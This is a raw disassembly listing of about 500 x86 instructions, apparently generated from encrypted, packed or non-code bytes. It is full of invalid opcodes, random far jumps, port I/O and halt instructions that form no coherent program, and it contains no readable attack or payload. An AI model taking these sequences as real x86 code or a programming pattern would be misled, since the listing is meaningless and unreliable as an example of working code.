  409f82:	mov    ds:0xb2ba4f7e,eax
  409f87:	out    dx,eax
  409f88:	les    ebp,FWORD PTR [ebp+0x43]
  409f8b:	or     al,0x8c
  409f8d:	adc    al,0x4e
  409f8f:	mov    esi,0xb9a40ace
  409f94:	loope  0x40a012
  409f96:	rcr    BYTE PTR [edx-0x49],cl
  409f99:	pop    ds
  409f9a:	ins    DWORD PTR es:[edi],dx
  409f9b:	dec    edx
  409f9c:	pop    ebx
  409f9d:	ds jle 0x409f37
  409fa0:	xor    BYTE PTR [esi],cl
  409fa2:	ins    BYTE PTR es:[edi],dx
  409fa3:	inc    ebp
  409fa4:	cmp    eax,0x2a4a0d0e
  409fa9:	add    edx,DWORD PTR [ebx-0x720f3934]
  409faf:	push   ebp
  409fb0:	add    al,0xe7
  409fb2:	jno    0x409f8e
  409fb4:	adc    al,0x67
  409fb6:	pushf  
  409fb7:	lock push esi
  409fb9:	push   ebx
  409fba:	mov    ebp,0x10348353
  409fbf:	mov    dh,0xc4
  409fc1:	ins    BYTE PTR es:[edi],dx
  409fc2:	push   ebx
  409fc3:	outs   dx,DWORD PTR ds:[esi]
  409fc4:	hlt    
  409fc5:	popa   
  409fc6:	bound  ebx,QWORD PTR [edi-0x2fb44cf3]
  409fcc:	jae    0x409f90
  409fce:	xor    al,0x88
  409fd0:	jae    0x409f91
  409fd2:	xor    eax,DWORD PTR [ebp+0xc]
  409fd5:	(bad)  
  409fd6:	jmp    0x4c33:0x9a4ff4e6
  409fdd:	call   0x936d5f77
  409fe2:	xor    eax,0xc8c70f66
  409fe7:	les    ecx,FWORD PTR [edx-0x6f1b29fa]
  409fed:	dec    eax
  409fee:	out    0x35,al
  409ff0:	retf   
  409ff1:	data16 clc 
  409ff3:	test   DWORD PTR [edx+0x532e96aa],ebp
  409ff9:	shl    ecx,1
  409ffb:	dec    ebp
  409ffc:	cmp    al,0x8a
  409ffe:	out    dx,al
  409fff:	arpl   WORD PTR [eax+0x4d],dx
  40a002:	pop    DWORD PTR [ebx+eax*4]
  40a005:	outs   dx,DWORD PTR ds:[esi]
  40a006:	and    DWORD PTR [ebp-0x6b],edx
  40a009:	add    ebx,DWORD PTR [esi-0x44b89ce6]
  40a00f:	adc    eax,0xdd756b9f
  40a014:	pop    ds
  40a015:	or     esi,DWORD PTR [edi-0x42]
  40a018:	into   
  40a019:	or     al,0x3a
  40a01b:	int3   
  40a01c:	ds push cs
  40a01e:	dec    eax
  40a01f:	jbe    0x40a071
  40a021:	cmp    eax,0x6b39f882
  40a026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a027:	add    dl,BYTE PTR [edi]
  40a029:	dec    ebx
  40a02a:	call   0xb2f6d457
  40a02f:	dec    ecx
  40a030:	pushf  
  40a031:	cmp    ebx,DWORD PTR [eax+0x44e10e56]
  40a037:	fnstcw WORD PTR [ebx+0x6f9b4705]
  40a03d:	cmp    eax,0xf6f8b489
  40a042:	ret    
  40a043:	pusha  
  40a044:	pop    eax
  40a045:	das    
  40a046:	pop    DWORD PTR [edi+0x29]
  40a049:	dec    ebp
  40a04a:	test   al,0x9d
  40a04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a04d:	sub    BYTE PTR [eax],0x6c
  40a050:	mov    ds:0x712dc1e3,al
  40a055:	add    BYTE PTR [ebx-0x587e092b],0x86
  40a05c:	push   edi
  40a05d:	test   DWORD PTR [edx],eax
  40a05f:	sahf   
  40a060:	add    al,0x58
  40a062:	or     eax,0x13cbe4f6
  40a067:	scas   al,BYTE PTR es:[edi]
  40a068:	out    dx,eax
  40a069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a06a:	jle    0x40a006
  40a06c:	dec    edi
  40a06d:	sar    ebp,cl
  40a06f:	cdq    
  40a070:	and    eax,DWORD PTR [edx-0x6d]
  40a073:	xor    ecx,ebx
  40a075:	xchg   esi,eax
  40a076:	out    dx,al
  40a077:	retf   0x7ad
  40a07a:	pop    esi
  40a07b:	xor    DWORD PTR [ecx-0x3f],ebx
  40a07e:	cli    
  40a07f:	int    0xbf
  40a081:	sahf   
  40a082:	out    0xa2,al
  40a084:	mov    bl,0xaf
  40a086:	pop    ebx
  40a087:	or     edi,DWORD PTR [ecx-0x642a14c2]
  40a08d:	mov    ss,WORD PTR [edx-0x20281ff]
  40a093:	jae    0x40a0a6
  40a095:	jae    0x40a0a7
  40a097:	dec    esp
  40a098:	sbb    ecx,ebp
  40a09a:	(bad)  
  40a09b:	jle    0x40a0fb
  40a09d:	outs   dx,BYTE PTR ds:[esi]
  40a09e:	gs add ah,BYTE PTR gs:[ecx+0x75032d19]
  40a0a6:	jae    0x40a039
  40a0a8:	bound  ecx,QWORD PTR [esi]
  40a0aa:	les    esi,FWORD PTR [edx-0x54ffaac1]
  40a0b0:	cwde   
  40a0b1:	ins    DWORD PTR es:[edi],dx
  40a0b2:	and    DWORD PTR [edx-0x4688a447],0xffffff94
  40a0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0ba:	inc    ebx
  40a0bb:	push   esi
  40a0bc:	jns    0x40a135
  40a0be:	int3   
  40a0bf:	and    DWORD PTR [edi+ebx*4+0x32a373f6],ebx
  40a0c6:	scas   eax,DWORD PTR es:[edi]
  40a0c7:	mov    dh,0x2d
  40a0c9:	adc    eax,0x1d5f881e
  40a0ce:	mov    edi,0x6e01209a
  40a0d3:	mov    WORD PTR [edi+edi*1],es
  40a0d6:	dec    eax
  40a0d7:	stos   BYTE PTR es:[edi],al
  40a0d8:	sti    
  40a0d9:	sub    edi,DWORD PTR [eax+0x693f73ee]
  40a0df:	xchg   esi,eax
  40a0e0:	dec    ebx
  40a0e1:	or     bh,bl
  40a0e3:	inc    edi
  40a0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0e5:	lock loopne 0x40a15f
  40a0e8:	ins    DWORD PTR es:[edi],dx
  40a0e9:	imul   ecx,DWORD PTR [eax+0x429a6209],0xffffffb5
  40a0f0:	sbb    eax,0xe2e97559
  40a0f5:	and    cl,BYTE PTR [eax-0x32]
  40a0f8:	jmp    0xfaae:0xb518975d
  40a0ff:	add    dh,BYTE PTR [edx+edi*4+0x49]
  40a103:	je     0x40a122
  40a105:	xchg   edi,eax
  40a106:	test   eax,0x24909b99
  40a10b:	add    esi,ecx
  40a10d:	test   ebp,esp
  40a10f:	jb     0x40a0b0
  40a111:	sub    eax,0x67727722
  40a116:	and    eax,0x512e0d1b
  40a11b:	ja     0x40a161
  40a11d:	xor    al,0xf6
  40a11f:	sbb    DWORD PTR [esi-0x1552d6ca],ebx
  40a125:	add    ch,BYTE PTR [ebp-0x1d]
  40a128:	ret    0x761a
  40a12b:	mov    eax,ds:0x25f9da84
  40a130:	(bad)  
  40a131:	mov    ecx,0xf9fbcf9b
  40a136:	xchg   BYTE PTR [eax],dh
  40a138:	mov    edi,DWORD PTR [ecx+0x10]
  40a13b:	sub    DWORD PTR [ecx-0x7b],0xffffff81
  40a13f:	aas    
  40a140:	mov    ebp,0x6862f0c6
  40a145:	jecxz  0x40a188
  40a147:	pusha  
  40a148:	pushf  
  40a149:	ret    
  40a14a:	mov    ds:0x3d24e1d2,al
  40a14f:	jb     0x40a0d9
  40a151:	arpl   WORD PTR [edx+esi*4+0x7d047480],si
  40a158:	pop    ecx
  40a159:	xor    eax,0x776a97a8
  40a15e:	(bad)  
  40a15f:	aad    0x17
  40a161:	stos   DWORD PTR es:[edi],eax
  40a162:	icebp  
  40a163:	inc    edi
  40a164:	stc    
  40a165:	loop   0x40a0eb
  40a167:	inc    edi
  40a168:	sbb    bl,BYTE PTR [edi-0x303aa8e6]
  40a16e:	call   FWORD PTR [eax-0x4c]
  40a171:	jmp    FWORD PTR ds:0x7bde4afe
  40a177:	mov    esp,edi
  40a179:	shr    BYTE PTR [edi],1
  40a17b:	adc    cl,dl
  40a17d:	xor    bh,BYTE PTR [esi+0x24]
  40a180:	mov    esi,0xa4a42818
  40a185:	or     BYTE PTR [ecx+0x2d03e5f],0x3f
  40a18c:	jge    0x40a20d
  40a18e:	xchg   ebp,eax
  40a18f:	fistp  DWORD PTR [ecx+0x7936c37b]
  40a195:	push   cs
  40a196:	stos   DWORD PTR es:[edi],eax
  40a197:	es je  0x40a1ad
  40a19a:	loopne 0x40a152
  40a19c:	loop   0x40a190
  40a19e:	fdiv   DWORD PTR [esi-0x1550c20c]
  40a1a4:	daa    
  40a1a5:	lahf   
  40a1a6:	call   DWORD PTR [eax-0x26]
  40a1a9:	adc    ebx,edx
  40a1ab:	mov    dl,BYTE PTR [ebp-0x1c57e9e]
  40a1b1:	hlt    
  40a1b2:	mov    es,WORD PTR [ebx]
  40a1b4:	into   
  40a1b5:	or     DWORD PTR [ecx],eax
  40a1b7:	or     DWORD PTR [eax-0x1cc922f2],edx
  40a1bd:	imul   esp,DWORD PTR [eax],0x7e
  40a1c0:	(bad)  
  40a1c1:	pop    ebp
  40a1c2:	pop    ss
  40a1c3:	mov    dh,0xb6
  40a1c5:	int3   
  40a1c6:	mov    ah,bh
  40a1c8:	push   ecx
  40a1c9:	sahf   
  40a1ca:	loope  0x40a249
  40a1cc:	xor    cl,BYTE PTR [eax+0x12ad9587]
  40a1d2:	xchg   ebx,eax
  40a1d3:	pop    ebp
  40a1d4:	clc    
  40a1d5:	or     DWORD PTR [esi+eax*2],ecx
  40a1d8:	aad    0xac
  40a1da:	mov    cl,0x8d
  40a1dc:	add    al,0x1d
  40a1de:	das    
  40a1df:	pop    ecx
  40a1e0:	loop   0x40a239
  40a1e2:	jbe    0x40a1bc
  40a1e4:	sub    BYTE PTR [edx+0x41],ah
  40a1e7:	mov    ds:0x83546dab,eax
  40a1ec:	xchg   DWORD PTR ds:0xbedcf96d,ebx
  40a1f2:	jo     0x40a251
  40a1f4:	imul   esi,DWORD PTR [edi+0x5de5573a],0x4d
  40a1fb:	cmp    DWORD PTR [esi],esp
  40a1fd:	jne    0x40a24c
  40a1ff:	icebp  
  40a200:	test   edx,esp
  40a202:	arpl   WORD PTR [edi-0x6f],bp
  40a205:	test   eax,0xc2484f67
  40a20a:	test   bh,ch
  40a20c:	mov    esi,0xebaeca39
  40a211:	cmp    al,bl
  40a213:	push   0x7d
  40a215:	call   0x5cc1621d
  40a21a:	mov    ds:0xf3acdc45,al
  40a21f:	and    BYTE PTR [edx],ch
  40a221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a222:	mov    dh,0x20
  40a224:	add    BYTE PTR [eax],dh
  40a226:	out    dx,eax
  40a227:	pusha  
  40a228:	push   edx
  40a229:	mov    ds:0xac9bae11,eax
  40a22e:	xchg   ebx,eax
  40a22f:	push   0x66
  40a231:	pop    ss
  40a232:	rcr    bh,cl
  40a234:	ins    BYTE PTR es:[edi],dx
  40a235:	popa   
  40a236:	neg    DWORD PTR [edi-0x54]
  40a239:	add    DWORD PTR [ecx-0x22b76a08],edi
  40a23f:	ins    BYTE PTR es:[edi],dx
  40a240:	cli    
  40a241:	repnz mov bl,0xb4
  40a244:	add    edi,DWORD PTR ds:0xf58241ca
  40a24a:	cmp    ecx,eax
  40a24c:	sub    edx,eax
  40a24e:	popa   
  40a24f:	add    al,0x45
  40a251:	or     eax,0x6a79897f
  40a256:	pop    ebp
  40a257:	dec    edi
  40a258:	bound  edi,QWORD PTR es:[edx-0x59]
  40a25c:	jl     0x40a27c
  40a25e:	stos   DWORD PTR es:[edi],eax
  40a25f:	fldenv [esi]
  40a261:	sub    edx,ebp
  40a263:	out    dx,al
  40a264:	out    dx,al
  40a265:	push   esi
  40a266:	out    0xac,al
  40a268:	cmp    BYTE PTR [edi+0x3b],ah
  40a26b:	cmc    
  40a26c:	fdivrp st(5),st
  40a26e:	pusha  
  40a26f:	not    dh
  40a271:	inc    ebp
  40a272:	sub    DWORD PTR [ebp-0x7ba849a2],esp
  40a278:	add    al,0xd
  40a27a:	and    DWORD PTR [ebx+0x49],ebx
  40a27d:	fstp   QWORD PTR [esi]
  40a27f:	inc    esp
  40a280:	out    dx,eax
  40a281:	fidivr WORD PTR [ebp+0x2395ca99]
  40a287:	lods   al,BYTE PTR ds:[esi]
  40a288:	inc    ebp
  40a289:	out    0xe3,al
  40a28b:	shl    DWORD PTR [edx-0x5f],1
  40a28e:	nop
  40a28f:	and    dl,bl
  40a291:	mov    ebx,0x6710fdd9
  40a296:	imul   edx,esp,0x17
  40a299:	pop    ss
  40a29a:	xchg   ebp,eax
  40a29b:	pop    esp
  40a29c:	xchg   edi,eax
  40a29d:	lods   al,BYTE PTR ds:[esi]
  40a29e:	dec    edx
  40a29f:	adc    DWORD PTR [ebp+0x49],esp
  40a2a2:	add    eax,0x4abe69af
  40a2a7:	or     al,0x9d
  40a2a9:	sub    eax,0x3699b8a1
  40a2ae:	into   
  40a2af:	imul   ebp,DWORD PTR [eax-0x4a],0x44
  40a2b3:	or     ch,BYTE PTR [edi+eiz*4]
  40a2b6:	out    dx,eax
  40a2b7:	mov    eax,0x5dcd1e26
  40a2bc:	mov    ch,BYTE PTR [eax]
  40a2be:	xlat   BYTE PTR ds:[ebx]
  40a2bf:	(bad)  
  40a2c1:	xlat   BYTE PTR ds:[ebx]
  40a2c2:	pop    ds
  40a2c3:	fild   QWORD PTR [edi-0x450bd0d0]
  40a2c9:	xchg   BYTE PTR [ebp+ebp*4+0x524b2b2],bh
  40a2d0:	pop    ds
  40a2d1:	mov    dl,0x4a
  40a2d3:	and    al,0xb7
  40a2d5:	jecxz  0x40a325
  40a2d7:	getsec 
  40a2d9:	and    al,0x55
  40a2db:	pusha  
  40a2dc:	jle    0x40a29b
  40a2de:	mov    edi,0x5e84eb9d
  40a2e3:	and    al,0x91
  40a2e5:	jb     0x40a303
  40a2e7:	lock mov al,0xce
  40a2ea:	popf   
  40a2eb:	leave  
  40a2ec:	iret   
  40a2ed:	mov    ch,0xac
  40a2ef:	fist   WORD PTR [edx+eiz*2+0x51]
  40a2f3:	stc    
  40a2f4:	leave  
  40a2f5:	inc    esp
  40a2f6:	je     0x40a32f
  40a2f8:	jnp    0x40a2ed
  40a2fa:	lahf   
  40a2fb:	ret    
  40a2fc:	stos   DWORD PTR es:[edi],eax
  40a2fd:	pop    ds
  40a2fe:	pushf  
  40a2ff:	int    0x2e
  40a301:	dec    esi
  40a302:	test   al,0xc5
  40a304:	pop    edx
  40a305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a306:	lahf   
  40a307:	xchg   ebx,eax
  40a308:	cld    
  40a309:	inc    ebp
  40a30a:	xchg   esp,eax
  40a30b:	mov    edi,0x79bf3a07
  40a310:	push   edx
  40a311:	push   esi
  40a312:	or     BYTE PTR [ecx],dh
  40a314:	aam    0xb8
  40a316:	fimul  WORD PTR [edx]
  40a318:	xor    eax,0x9ec3ac2a
  40a31d:	inc    ebp
  40a31e:	lahf   
  40a31f:	cmp    al,0xa9
  40a321:	mov    ecx,0x1c1aa6c8
  40a326:	stos   BYTE PTR es:[edi],al
  40a327:	stos   DWORD PTR es:[edi],eax
  40a328:	mov    esp,0xa1468508
  40a32d:	ret    
  40a32e:	fild   WORD PTR [esi+edx*8]
  40a331:	mov    dh,0xd
  40a333:	mov    ecx,0xdb05d268
  40a338:	sbb    cl,BYTE PTR [esi]
  40a33a:	and    esi,ebx
  40a33c:	pusha  
  40a33d:	sub    edx,edi
  40a33f:	pop    ebp
  40a340:	jns    0x40a393
  40a342:	hlt    
  40a343:	stc    
  40a344:	inc    ebp
  40a345:	xor    al,0xca
  40a347:	clc    
  40a348:	adc    eax,0x8faa1c9c
  40a34d:	mov    edx,0x7420c510
  40a352:	sub    ch,BYTE PTR [edx+0x1abcb031]
  40a358:	(bad)  
  40a35c:	and    eax,0x40c66787
  40a361:	dec    edi
  40a362:	sub    esi,edi
  40a364:	pop    ebx
  40a365:	xor    edx,DWORD PTR [ebx+0x54]
  40a368:	int    0xa9
  40a36a:	push   ds
  40a36b:	cmp    eax,0x340e3e80
  40a370:	pop    edi
  40a371:	jbe    0x40a3a9
  40a373:	and    esp,DWORD PTR [ecx+0x4a883751]
  40a379:	outs   dx,BYTE PTR ds:[esi]
  40a37a:	inc    esi
  40a37b:	add    BYTE PTR [esi+ebp*8-0x7778e14a],dl
  40a382:	dec    DWORD PTR [esi+0x1a5a7c8c]
  40a388:	(bad)  
  40a389:	cdq    
  40a38a:	sar    DWORD PTR [esi+0x5e1904c9],0x53
  40a391:	or     al,0x33
  40a393:	stc    
  40a394:	out    0x92,eax
  40a396:	int    0x72
  40a398:	imul   eax,DWORD PTR [ebx],0x2844fcd5
  40a39e:	pop    ebp
  40a39f:	pop    esp
  40a3a0:	xor    DWORD PTR [esi+0x407f8fa1],esi
  40a3a6:	dec    esi
  40a3a7:	xchg   edx,esi
  40a3a9:	cmc    
  40a3aa:	in     eax,0x12
  40a3ac:	jmp    0x40a413
  40a3ae:	dec    eax
  40a3af:	lods   al,BYTE PTR ds:[esi]
  40a3b0:	adc    al,0xd1
  40a3b2:	sbb    DWORD PTR [esi],esp
  40a3b4:	mov    ah,0xe4
  40a3b6:	mov    al,0xee
  40a3b8:	retf   0xa47b
  40a3bb:	sub    eax,0x2a0683e0
  40a3c0:	and    DWORD PTR ds:[eax+0x69b30f5a],ecx
  40a3c7:	push   ebx
  40a3c8:	(bad)  
  40a3ca:	loope  0x40a39b
  40a3cc:	ja     0x40a3ac
  40a3ce:	pop    es
  40a3cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3d0:	add    al,0x90
  40a3d2:	adc    ebx,0xffffffe1
  40a3d5:	in     eax,dx
  40a3d6:	ret    
  40a3d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3d8:	sub    al,0xa6
  40a3da:	adc    ebx,esi
  40a3dc:	jecxz  0x40a374
  40a3de:	xor    sp,bx
  40a3e1:	les    ebp,FWORD PTR [eax+0x26]
  40a3e4:	cmc    
  40a3e5:	imul   esp,DWORD PTR [eax+0xb66ff2e],0xfffffff5
  40a3ec:	dec    ecx
  40a3ed:	xchg   esi,eax
  40a3ee:	mov    al,0x33
  40a3f0:	popf   
  40a3f1:	repnz dec edx
  40a3f3:	sub    DWORD PTR [esi+edx*4+0x2f84bc2],eax
  40a3fa:	aas    
  40a3fb:	push   0x8
  40a3fd:	xor    ah,BYTE PTR [ecx+eax*1]
  40a400:	xchg   edi,eax
  40a401:	pushf  
  40a402:	cdq    
  40a403:	mov    dl,BYTE PTR [esi+eax*1-0x3b]
  40a407:	mov    ds:0x47514827,eax
  40a40c:	inc    ebp
  40a40d:	dec    ebx
  40a40e:	xchg   edx,eax
  40a40f:	loop   0x40a478
  40a411:	mov    ah,0x87
  40a413:	add    esp,ecx
  40a415:	mov    esp,0x16a14de6
  40a41a:	das    
  40a41b:	xchg   edi,eax
  40a41c:	out    dx,al
  40a41d:	mov    edx,0xbb3b6e9a
  40a422:	lods   al,BYTE PTR ds:[esi]
  40a423:	xchg   esp,eax
  40a424:	int3   
  40a425:	hlt    
  40a426:	mov    edi,DWORD PTR [eax]
  40a428:	pop    edx
  40a429:	adc    BYTE PTR [eax+0x4e],0xf1
  40a42d:	sbb    al,0x74
  40a42f:	pop    ecx
  40a430:	pop    esi
  40a431:	mov    gs,WORD PTR [ebp+0x76]
  40a434:	xor    eax,DWORD PTR [ecx+ebp*1]
  40a437:	push   edx
  40a438:	cmp    dh,BYTE PTR [ebx-0x7263acf7]
  40a43e:	hlt    
  40a43f:	shl    BYTE PTR [edi-0xbd58878],cl
  40a445:	mov    ah,0x81
  40a447:	int    0xa3
  40a449:	cmp    DWORD PTR fs:[ebp+0x14],esi
  40a44d:	xor    bh,BYTE PTR [ecx]
  40a44f:	cmp    eax,0x5847ed60
  40a454:	mov    bl,0xfc
  40a456:	xchg   esp,eax
  40a457:	icebp  
  40a458:	(bad)  
  40a45a:	aad    0xf0
  40a45c:	xlat   BYTE PTR ds:[ebx]
  40a45d:	adc    eax,DWORD PTR [edi]
  40a45f:	sti    
  40a460:	or     ah,BYTE PTR [esi-0x6cb6b9c3]
  40a466:	add    al,0xf6
  40a468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a469:	loop   0x40a46a
  40a46b:	mov    ds:0x85a80a8f,al
  40a470:	push   ss
  40a471:	popa   
  40a472:	test   eax,0x41c74c19
  40a477:	sub    eax,0xf0c72ba8
  40a47c:	pop    edx
  40a47d:	xor    ch,BYTE PTR [ecx+eiz*2-0x3a294f27]
  40a484:	scas   eax,DWORD PTR es:[edi]
  40a485:	out    dx,eax
  40a486:	ficom  DWORD PTR [ecx-0x796e9003]
  40a48c:	shl    BYTE PTR [edi+0x56a9ede],cl
  40a492:	jl     0x40a4f2
  40a494:	add    dh,dh
  40a496:	addr16 push edi
  40a498:	cmc    
  40a499:	add    al,0xc1
  40a49b:	inc    eax
  40a49c:	and    ah,BYTE PTR [ecx+0x69]
  40a49f:	inc    eax
  40a4a0:	push   es
  40a4a1:	out    dx,al
  40a4a2:	hlt    
  40a4a3:	es dec edx
  40a4a5:	push   0xffffffe4
  40a4a7:	xor    DWORD PTR [esi-0x40],ecx
  40a4aa:	les    esi,FWORD PTR [ebx+edx*1-0x68]
  40a4ae:	mov    bl,0x11
  40a4b0:	test   BYTE PTR [edi-0x4bd25223],ch
  40a4b6:	mov    ebx,0xcb8045d1
  40a4bb:	pop    edx
  40a4bc:	cmp    eax,0x6c2389f0
  40a4c1:	cmp    eax,0xe8c35f8f
  40a4c6:	fldcw  WORD PTR [ecx+0x34]
  40a4c9:	inc    ebx
  40a4ca:	(bad)  
  40a4cb:	fiadd  WORD PTR [esi-0x16]
  40a4ce:	out    dx,al
  40a4cf:	jmp    0xcac16444
  40a4d4:	xchg   ebx,eax
  40a4d5:	xchg   esi,eax
  40a4d6:	sub    edi,DWORD PTR [edi-0x4dffa504]
  40a4dc:	push   ebp
  40a4dd:	push   es
  40a4de:	sbb    al,0x68
  40a4e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4e1:	or     ah,bl
  40a4e3:	adc    BYTE PTR [ebp-0x7056b2e7],0x11
  40a4ea:	cmp    bl,ch
  40a4ec:	fcmovb st,st(4)
  40a4ee:	pop    edx
  40a4ef:	mov    DWORD PTR [ebx+0x7f4b538f],ecx
  40a4f5:	aam    0xf7
  40a4f7:	enter  0xd805,0x23
  40a4fb:	xchg   edi,eax
  40a4fc:	mul    bl
  40a4fe:	in     eax,0x6e
  40a500:	mov    ds:0x3ef8e5c1,eax
  40a505:	mov    bh,0xb8
  40a507:	mov    ebx,0x6d7d2cbc
  40a50c:	mov    eax,ds:0x24ee5864
  40a511:	and    ah,cl
  40a513:	mov    esp,0x3d40e9ff
  40a518:	rcl    BYTE PTR [ebx-0x3a7f5c15],0x17
  40a51f:	mov    bh,0xfc
  40a521:	xchg   esi,eax
  40a522:	call   0x192daeee
  40a527:	stos   DWORD PTR es:[edi],eax
  40a528:	loop   0x40a568
  40a52a:	and    esp,DWORD PTR [edi-0xa385084]
  40a530:	mov    al,0xd6
  40a532:	and    edi,DWORD PTR [edx+eiz*2-0x4a]
  40a536:	stc    
  40a537:	jb     0x40a5b3
  40a539:	ficom  WORD PTR [ecx]
  40a53b:	je     0x40a4e2
  40a53d:	(bad)  
  40a53e:	into   
  40a53f:	enter  0x903f,0x4c
  40a543:	inc    edi
  40a544:	cmp    DWORD PTR [edx+0x1404fbc2],esi
  40a54a:	dec    ecx
  40a54b:	hlt    
  40a54c:	jl     0x40a539
  40a54e:	mov    bl,0x9a
  40a550:	lea    esi,ds:0xfa7dd486
  40a556:	sbb    eax,0x88d0304d
  40a55b:	mov    eax,cs
  40a55d:	fs cmp edx,ebp
  40a560:	fwait
  40a561:	cmp    esi,DWORD PTR [eax-0x7de2df6]
  40a567:	fsub   DWORD PTR [eax-0x16e74fae]
  40a56d:	xchg   ebp,eax
  40a56e:	push   edx
  40a56f:	xchg   edi,eax
  40a570:	mov    cs,WORD PTR [edx]
  40a572:	call   0xc775:0x84dbe490
  40a579:	jge    0x40a59c
  40a57b:	dec    eax
  40a57c:	cmp    eax,0x904910f8
  40a581:	jb     0x40a58e
  40a583:	adc    al,0x65
  40a585:	xchg   ebp,eax
  40a586:	imul   ecx,esi,0x31
  40a589:	or     bl,BYTE PTR [ebx]
  40a58b:	into   
  40a58c:	ins    BYTE PTR es:[edi],dx
  40a58d:	push   ebp
  40a58e:	push   ebx
  40a58f:	repz out dx,eax
  40a591:	ss daa 
  40a593:	xchg   BYTE PTR [edx+0x30a87ed2],dh
  40a599:	das    
  40a59a:	pop    ds
  40a59b:	and    eax,0x4b2be671
  40a5a0:	int    0xd6
  40a5a2:	inc    eax
  40a5a3:	pop    eax
  40a5a4:	fld    DWORD PTR [eax-0x35]
  40a5a7:	mov    ebx,0xee8560de
  40a5ac:	sub    bh,BYTE PTR [edx+0x55]
  40a5af:	dec    ebx
  40a5b0:	mov    esi,ss
  40a5b2:	adc    eax,0x1470264f
  40a5b7:	and    al,0xe2
  40a5b9:	leave  
  40a5ba:	and    ebx,DWORD PTR [esi+0x6d]
  40a5bd:	lods   al,BYTE PTR ds:[esi]
  40a5be:	cmp    dh,al
  40a5c0:	jns    0x40a57b
  40a5c2:	and    al,0xcd
  40a5c4:	pop    es
  40a5c5:	pop    edx
  40a5c6:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40a5c8:	push   ebp
  40a5c9:	in     al,dx
  40a5ca:	in     eax,dx
  40a5cb:	sbb    edi,DWORD PTR [edx+0x55]
  40a5ce:	ficomp WORD PTR [ebx-0x41]
  40a5d1:	mov    ecx,0x82a80132
  40a5d6:	iret   
  40a5d7:	pop    edi
  40a5d8:	sbb    ebp,DWORD PTR [esi+0x7d0ec6d3]
  40a5de:	fnsave [edi+0x622bfe0d]
  40a5e4:	lahf   
  40a5e5:	pop    ss
  40a5e6:	sar    DWORD PTR [edi],cl
  40a5e8:	or     DWORD PTR [eax-0x1b883949],edx
  40a5ee:	push   ecx
  40a5ef:	iret   
  40a5f0:	pop    es
  40a5f1:	sub    BYTE PTR [edi-0x4be03075],bh
  40a5f7:	jb     0x40a5db
  40a5f9:	mov    edx,0xa11dbc9f
  40a5fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5ff:	mov    ebp,0x5b3ea8e4
  40a604:	mov    ebx,DWORD PTR ds:0x35916460
  40a60a:	mov    ds:0x5d5e410d,al
  40a60f:	and    eax,0xb71e0a2c
  40a614:	je     0x40a5c4
  40a616:	mov    al,ds:0x480e4192
  40a61b:	(bad)  
  40a61c:	jl     0x40a683
  40a61e:	(bad)  [ecx+0x4eb2f837]
  40a624:	outs   dx,BYTE PTR ds:[esi]
  40a625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a626:	jae    0x40a5cc
  40a628:	fs adc eax,0x73ec6a88
  40a62e:	dec    ecx
  40a62f:	iret   
  40a630:	inc    esi
  40a631:	jb     0x40a664
  40a633:	cmc    
  40a634:	adc    eax,DWORD PTR [edx-0x41]
  40a637:	cwde   
  40a638:	lock (bad) 
  40a63a:	cmp    al,0xc4
  40a63c:	ret    
  40a63d:	sbb    esi,esi
  40a63f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a640:	adc    al,0x3b
  40a642:	cdq    
  40a643:	mov    bl,0xba
  40a645:	sub    DWORD PTR [ebx],ecx
  40a647:	mov    dl,bl
  40a649:	retf   
  40a64a:	sbb    ch,al
  40a64c:	sbb    ch,BYTE PTR [eax-0x6805cb4b]
  40a652:	jmp    0xebda1be9
  40a657:	jne    0x40a5db
  40a659:	mov    dl,0x32
  40a65b:	mov    ebx,DWORD PTR [ebp+0x19]
  40a65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a65f:	loop   0x40a5e2
  40a661:	ss jnp 0x40a693
  40a664:	sahf   
  40a665:	jb     0x40a5e7
  40a667:	xchg   edi,eax
  40a668:	xor    al,0x73
  40a66a:	loop   0x40a618
  40a66c:	jecxz  0x40a653
  40a66e:	add    DWORD PTR [edx+0x14],edx
  40a671:	mov    dl,0xd5
  40a673:	xchg   ebp,eax
  40a674:	pop    es
  40a675:	fs sub al,0xbc
  40a678:	sbb    DWORD PTR [eax-0x13],esi
  40a67b:	xor    al,0x14
  40a67d:	push   es
  40a67e:	or     DWORD PTR [eax-0x7a329b59],esi
  40a684:	adc    eax,0x2b34458f
  40a689:	mov    esi,gs
  40a68b:	or     BYTE PTR [eax],cl
  40a68d:	dec    ecx
  40a68e:	stc    
  40a68f:	loop   0x40a668
  40a691:	out    0x7b,al
  40a693:	push   edx
  40a694:	push   ss
  40a695:	sti    
  40a696:	dec    edx
  40a697:	lods   eax,DWORD PTR ds:[esi]
  40a698:	dec    esi
  40a699:	or     bl,BYTE PTR [ecx]
  40a69b:	xchg   esp,eax
  40a69c:	pop    edi
  40a69d:	adc    BYTE PTR [ebp+0x4f],0x7c
  40a6a1:	daa    
  40a6a2:	cmp    esi,DWORD PTR [ebx+edx*2-0x4c485299]
  40a6a9:	iret   
  40a6aa:	inc    edx
  40a6ab:	popf   
  40a6ac:	retf   
  40a6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6ae:	dec    cl
  40a6b0:	int3   
  40a6b1:	jns    0x40a6ce
  40a6b3:	int    0xad
  40a6b5:	push   ecx
  40a6b6:	cmp    ah,al
  40a6b8:	dec    ebx
  40a6b9:	and    esi,DWORD PTR [esi+eiz*4+0x64096be6]
  40a6c0:	out    0x18,eax
  40a6c2:	add    al,0x17
  40a6c4:	lds    edi,FWORD PTR [ecx+edi*2]
  40a6c7:	cmp    al,0xdf
